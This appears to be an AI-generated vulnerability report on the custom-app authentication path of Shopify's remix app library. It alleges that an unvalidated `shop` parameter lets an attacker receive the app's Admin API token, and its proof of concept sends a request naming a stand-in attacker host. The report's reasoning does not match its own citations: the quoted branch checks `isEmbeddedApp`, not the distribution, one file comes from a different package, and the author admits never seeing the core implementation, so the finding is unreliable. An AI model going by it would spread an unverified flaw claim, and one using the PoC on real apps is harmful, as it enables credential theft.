Based on my research, I found a genuine analog in the `ShopifyAdmin` distribution (custom/merchant-custom app) authentication path.

### Title
Unsanitized, unauthenticated `shop` query parameter used to construct outbound Admin API requests for custom apps, leaking the static `adminApiAccessToken` to an attacker-controlled host - (File: `packages/apps/shopify-app-remix/src/server/authenticate/admin/authenticate.ts`, `packages/apps/shopify-app-remix/src/server/authenticate/admin/helpers/validate-shop-and-host-params.ts`)

### Summary
For `AppDistribution.ShopifyAdmin` ("custom app"/merchant-custom) configurations, the admin authentication path derives the trusted `shop` value directly from the raw, unauthenticated `?shop=` query parameter, completely skipping both the JWT/session-token trust chain used by every other distribution and the `sanitizeShop` validation performed for those other distributions. This value is then used to build the `Session` (and by extension the outbound Admin API client URL) together with the app's single statically configured `adminApiAccessToken`.

### Finding Description
In `getSessionTokenContext`, when `config.distribution === AppDistribution.ShopifyAdmin`, the function bypasses `validateSessionToken` entirely and takes `shop` straight off the URL: [1](#0-0) 

Compare this to the non-`ShopifyAdmin` branch just above it, where `shop` is only trusted after `validateSessionToken` cryptographically verifies the session token JWT and extracts `shop` from its signed `dest` claim: [2](#0-1) 

Making matters worse, `validateShopAndHostParams` — the one place that calls `api.utils.sanitizeShop` on the `shop` parameter — explicitly excludes the `ShopifyAdmin` distribution from this check: [3](#0-2) 

The resulting unauthenticated, unsanitized `shop` string is passed straight into `strategy.authenticate(request, {session: existingSession, sessionToken, shop})`, and test coverage confirms the `MerchantCustomAuth` strategy builds a working `Session`/admin client purely from whatever `shop` value was supplied in the URL, combined with the developer's static `adminApiAccessToken`: [4](#0-3) [5](#0-4) 

### Impact Explanation
This mirrors the M-07 bug class: one code path (the token-exchange/session-token flow) enforces a strict invariant (shop must come from a cryptographically signed source), while a second, independent code path (`ShopifyAdmin`/custom-app flow) constructs the same downstream artifact (a `Session`/Admin API client) from an untrusted, unvalidated value, and nothing reconciles the two. Any anonymous requester can hit the app with an arbitrary `?shop=attacker-controlled-host` value. Because the custom-app `Session` is built with the app's single static `adminApiAccessToken`, any Admin API GraphQL/REST call made by the app for that session will be sent to `https://{attacker-controlled-shop}/admin/api/{version}/...` carrying the app's real Admin API access token in the `Authorization` header — leaking that secret to a host of the attacker's choosing (SSRF-style credential exfiltration), and confusing the app into acting against the wrong tenant.

### Likelihood Explanation
No privileged access, secret leak, or MITM position is required — a single anonymous HTTP request with a crafted `shop` query parameter against a `ShopifyAdmin`-distribution app is sufficient to trigger the mismatch between the "should be validated" shop and the actually-unvalidated shop used to build outbound requests.

### Recommendation
For `AppDistribution.ShopifyAdmin`, do not trust the raw `shop` query parameter for anything beyond display/logging. Either: (a) hardcode/derive the shop from the app's own configuration since custom apps are single-tenant by design, ignoring the request-supplied value entirely, or (b) always run the `shop` parameter through `sanitizeShop`/a `.myshopify.io` domain allowlist check and reject requests where it doesn't match the shop the `adminApiAccessToken` was issued for, before it is used to build any `Session` or outbound Admin API URL.

### Proof of Concept
1. Deploy a `shopify-app-remix` (or `shopify-app-react-router`) app configured with `distribution: AppDistribution.ShopifyAdmin` and a static `adminApiAccessToken`.
2. As an anonymous client, send `GET {appUrl}?shop=attacker-controlled-host.example` to any route wrapped by `shopify.authenticate.admin`.
3. Observe (per `merchant-custom/authenticate.test.ts` and `admin-client.test.ts` behavior) that a `Session` is constructed with `shop = attacker-controlled-host.example` and the app's real `adminApiAccessToken`.
4. Any subsequent Admin API call made through `admin.graphql()`/`admin.rest` for this session is sent to `https://attacker-controlled-host.example/admin/api/...` with the `Authorization` header containing the app's real access token, disclosing the secret to the attacker's host.

Note: I was unable to view the full contents of `merchant-custom-app.ts` (the strategy implementation itself) due to index size limits — only its tests were available. If deeper verification of exactly how the `Session.shop`/access token pair maps to the outbound HTTP client URL is needed, a Devin session with full repo access should be used to inspect `packages/apps/shopify-app-remix/src/server/authenticate/admin/strategies/merchant-custom-app.ts` directly.

### Citations

**File:** packages/apps/shopify-app-remix/src/server/authenticate/admin/authenticate.ts (L207-229)
```typescript
  if (config.isEmbeddedApp) {
    const payload = await validateSessionToken(params, request, sessionToken);
    const dest = new URL(payload.dest);
    const shop = dest.hostname;

    logger.debug('Session token is valid - authenticated', {shop, payload});
    const sessionId = config.useOnlineTokens
      ? api.session.getJwtSessionId(shop, payload.sub)
      : api.session.getOfflineId(shop);

    return {shop, payload, sessionId, sessionToken};
  }

  const url = new URL(request.url);
  const shop = url.searchParams.get('shop')!;

  const sessionId = await api.session.getCurrentId({
    isOnline: config.useOnlineTokens,
    rawRequest: request,
  });

  return {shop, sessionId, payload: undefined, sessionToken};
}
```

**File:** packages/apps/shopify-app-react-router/src/server/authenticate/admin/helpers/validate-shop-and-host-params.ts (L5-19)
```typescript
export function validateShopAndHostParams(
  params: BasicParams,
  request: Request,
) {
  const {api, config, logger} = params;

  if (config.distribution !== AppDistribution.ShopifyAdmin) {
    const url = new URL(request.url);
    const shop = api.utils.sanitizeShop(url.searchParams.get('shop')!);
    if (!shop) {
      logger.debug('Missing or invalid shop, rendering App Bridge', {
        shop,
      });
      throw renderAppBridgeOrError(request, params);
    }
```

**File:** packages/apps/shopify-app-remix/src/server/authenticate/admin/strategies/__tests__/merchant-custom/authenticate.test.ts (L10-29)
```typescript
describe('authenticate', () => {
  it('creates a valid session from the configured access token', async () => {
    // GIVEN
    const config = testConfig({
      isEmbeddedApp: false,
      distribution: AppDistribution.ShopifyAdmin,
      adminApiAccessToken: 'test-token',
    });
    const shopify = shopifyApp(config);

    const expectedSession = setupValidCustomAppSession(TEST_SHOP);

    // WHEN
    const {session} = await shopify.authenticate.admin(
      new Request(`${APP_URL}?shop=${TEST_SHOP}`),
    );

    // THEN
    expect(session).toEqual(expectedSession);
  });
```

**File:** packages/apps/shopify-app-remix/src/server/authenticate/admin/strategies/__tests__/merchant-custom/admin-client.test.ts (L68-86)
```typescript
async function setUpMerchantCustomFlow() {
  const shopify = shopifyApp(
    testConfig({
      isEmbeddedApp: false,
      distribution: AppDistribution.ShopifyAdmin,
      adminApiAccessToken: 'test-token',
    }),
  );

  const expectedSession = setupValidCustomAppSession(TEST_SHOP);

  const request = new Request(`${APP_URL}?shop=${TEST_SHOP}`);

  return {
    shopify,
    expectedSession,
    ...(await shopify.authenticate.admin(request)),
  };
}
```
